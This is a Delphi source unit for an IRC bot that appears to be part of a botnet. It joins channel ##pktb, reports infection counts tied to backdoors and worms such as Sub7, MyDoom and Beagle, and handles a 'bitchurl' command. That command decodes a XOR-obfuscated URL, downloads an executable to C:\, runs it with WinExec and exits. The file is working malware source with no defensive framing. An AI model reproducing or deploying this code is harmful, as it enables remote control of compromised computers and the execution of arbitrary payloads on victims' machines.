unit Bot;

interface

Uses
  Windows, Winsock;

Type
  TIPs        = ARRAY[0..10] OF STRING;
  
Var

  IPs         : TIPs;
  Addr: TSockAddrIn;
  Sock: TSocket;
  SWSA: TWSAData;

  WebServ  : Integer;
  NDevil   : Integer;
  Beagle1  : Integer;
  Beagle2  : Integer;
  Opx      : Integer;
  NetBios  : Integer;
  MyDoom   : Integer;
  Sb7      : Integer;
  ICQ      : Integer;
  MSN      : Integer;

  CurrentScanIP: String;

  silence: Bool;

  function LowerCase(const S: string): string;
  Function GetIP: String;
  function IPstr(HostName:String) : String;
  Procedure CreateBot(Server: String);
  Procedure SendData(Text: String);
  function URLDownloadToFile(Caller: cardinal; URL: PChar; FileName: PChar; Reserved: LongWord; StatusCB: cardinal): Longword; stdcall; external 'URLMON.DLL' name 'URLDownloadToFileA';

implementation

function LowerCase(const S: string): string;
var
  Ch: Char;
  L: Integer;
  Source, Dest: PChar;
begin
  L := Length(S);
  SetLength(Result, L);
  Source := Pointer(S);
  Dest := Pointer(Result);
  while L <> 0 do
  begin
    Ch := Source^;
    if (Ch >= 'A') and (Ch <= 'Z') then Inc(Ch, 32);
    Dest^ := Ch;
    Inc(Source);
    Inc(Dest);
    Dec(L);
  end;
end;

PROCEDURE GetIPs(VAR IPs:TIPS;VAR NumberOfIPs:BYTE);
TYPE
  TaPInAddr = ARRAY [0..10] OF PInAddr;
  PaPInAddr = ^TaPInAddr;
VAR
  phe       : PHostEnt;
  pptr      : PaPInAddr;
  Buffer    : ARRAY [0..63] OF Char;
  I         : Integer;
  GInitData : TWSAData;
BEGIN
  WSAStartup($101,GInitData);
  GetHostName(Buffer,SizeOf(Buffer));
  phe:=GetHostByName(Buffer);
  IF phe=NIL THEN Exit;
  pPtr:=PaPInAddr(phe^.h_addr_list);
  I:=0;
  WHILE pPtr^[I]<>NIL DO BEGIN
    IPs[I]:=inet_ntoa(pptr^[I]^);
    NumberOfIPs:=I;
    Inc(I);
  END;
  WSACleanup;
END;

Function GetIP: String;
VAR
  NumberOfIPs : Byte;
  I           : Byte;
  IP          : STRING;
Begin
  GetIPs(IPs,NumberOfIPs);
  FOR I:=0 TO NumberOfIPs DO
    IP:=IPs[I];
  Result := IP;
End;

function InttoStr(const Value: integer): string;
var
  S: string[11];
begin
  Str(Value, S);
  Result := S;
end;

Procedure SendData(Text: String);
Begin
  If Sock <= 0 Then Exit;
  If (Pos('PRIVMSG ##pktb :', Text) > 0) and (Silence) Then Exit;
  Send(Sock, Text[1], Length(Text), 0);
End;

Function CreateName: String;
Begin
  Randomize;              //12345678
  Result := 'B';
  While Length(Result) < 8 Do
    Result := Result + IntToStr(Random(9));
  Result := Result+'h';
End;

Function EncryptStr(Str: String): String;
Var
  I: Integer;
  C: Integer;
Begin
  Result := '';
  For I := 1 To Length(Str) Do
  Begin
    C := Ord(Str[i]);
    C := (C Xor 1) Xor 6;
    Result := Result + Chr(C);
  End;
End;

Function FixStr(Str: String; Count: Integer): String;
Begin
  While Length(Str) < Count Do
    Str := ' '+Str;
  Result := Str;
End;

Procedure ReadData;
Var
  I   : Integer;
  Data: Array[0..1600] Of Char;
  Temp: String;
  Tmp : String;
Begin
  While Recv(Sock, Data, 1600, 0) > 0 Do
  Begin
    Temp := Data;
    ZeroMemory(@Data, SizeOf(Data));

    If Pos('MOTD', Temp) > 0 Then
    Begin
      SendData('JOIN ##pktb '+#10);
    End;

    If Pos('PING :', Temp) > 0 Then
    Begin
      Temp := Copy(Temp, Pos('PING :', Temp), length(Temp));
      Temp := Copy(Temp, 1, Pos(#10, Temp)-1);
      If Temp[Length(Temp)] = #13 Then
      Temp := Copy(Temp, 1, Length(Temp)-1);
      Delete(Temp, 2, 1);
      Insert('O', Temp, 2);
      SendData(Temp+#10);
    End;

    If pos('shutup', Temp) > 0 Then Silence := True;
    If Pos('shutdown', Temp) > 0 Then Silence := False;

    If Pos('botstatus', Temp) > 0 Then
    Begin
      Temp := 'PRIVMSG ##pktb :';
      Temp := Temp + 'IP('+FixStr(getip, 15)+') ';
      Temp := Temp + 'Webserv('+FixStr(IntToStr(WebServ), 6)+') ';
      Temp := Temp + 'NetDevil('+FixStr(IntToStr(NDevil), 6)+') ';
      Temp := Temp + 'Beagle1('+FixStr(IntToStr(Beagle1), 6)+') ';
      Temp := Temp + 'Beagle2('+FixStr(IntToStr(Beagle2), 6)+') ';
      Temp := Temp + 'Optix('+FixStr(IntToStr(Opx), 6)+') ';
      Temp := Temp + 'NetBios('+FixStr(IntToStr(NetBios), 6)+') ';
      Temp := Temp + 'MyDoom('+FixStr(IntToStr(MyDoom), 6)+') ';
      Temp := Temp + 'Sub7('+FixStr(IntToStr(Sb7), 6)+') ';
      Temp := Temp + 'ICQ('+FixStr(IntToStr(ICQ), 6)+') ';
      Temp := Temp + 'MSN('+FixStr(IntToStr(MSN), 6)+')'#10;
      SendData(Temp);
      Temp := 'PRIVMSG ##pktb :Current Scan IP '+CurrentScanIP+#10;
      SendData(Temp);
    End;

    If Pos('bitchurl :', Temp) > 0 Then
    Begin
      Temp := Copy(Temp, Pos('url :',Temp), Length(Temp));
      Temp := Copy(Temp, Pos(':',Temp)+1, Length(Temp));
      Tmp := 'C:\'+CreateName+'.exe';
      If Temp[Length(Temp)] = #10 Then Temp := Copy(Temp, 1, Length(Temp)-1);
      If Temp[Length(Temp)] = #13 Then Temp := Copy(Temp, 1, Length(Temp)-1);
      Temp := EncryptStr(Temp);
      URLDownloadToFile(0, pChar(Temp), pChar(Tmp), 0, 0);
      WinExec(pChar(Tmp), 1);
      SendData('PRIVMSG ##pktb :File Downloaded && Executed'#10);
      ExitProcess(0);
    End;

  End;
End;

function IPstr(HostName:String) : String;
LABEL Abort;
TYPE
  TAPInAddr = ARRAY[0..100] OF PInAddr;
  PAPInAddr =^TAPInAddr;
VAR
  WSAData    : TWSAData;
  HostEntPtr : PHostEnt;
  pptr       : PAPInAddr;
  I          : Integer;
BEGIN
  Result:='';
  WSAStartUp($101,WSAData);
  TRY
    HostEntPtr:=GetHostByName(PChar(HostName));
    IF HostEntPtr=NIL THEN GOTO Abort;
    pptr:=PAPInAddr(HostEntPtr^.h_addr_list);
    I:=0;
    WHILE pptr^[I]<>NIL DO BEGIN
      IF HostName='' THEN BEGIN
        IF(Pos('168',inet_ntoa(pptr^[I]^))<>1)AND(Pos('192',inet_ntoa(pptr^[I]^))<>1) THEN BEGIN
          Result:=inet_ntoa(pptr^[I]^);
          GOTO Abort;
        END;
      END ELSE
      RESULT:=(inet_ntoa(pptr^[I]^));
      Inc(I);
    END;
    Abort:
  EXCEPT
  END;
  WSACleanUp();
END;

Procedure CreateBot(Server: String);
Var
  Name: String;
Begin
  silence := False;
  WSAStartUp(makeword(2,1), SWSA);

  Sock := Socket(af_inet, sock_stream, 0);
  If Sock = -1 Then Exit;

  Addr.sin_family := af_inet;
  Addr.sin_port := htons(6667);
  Addr.sin_addr.S_addr := inet_addr(pChar(IpStr(Server)));

  If Connect(Sock, Addr, SizeOf(Addr)) = ERROR_SUCCESS Then
  Begin
    Name := CreateName;
    SendData('USER '+Name+' '+Name+'@mailshit.com "win2k" :'+Name+#10);
    SendData('NICK '+Name+#10);
    ReadData;
  End;

  WSACleanUp();
End;

end.

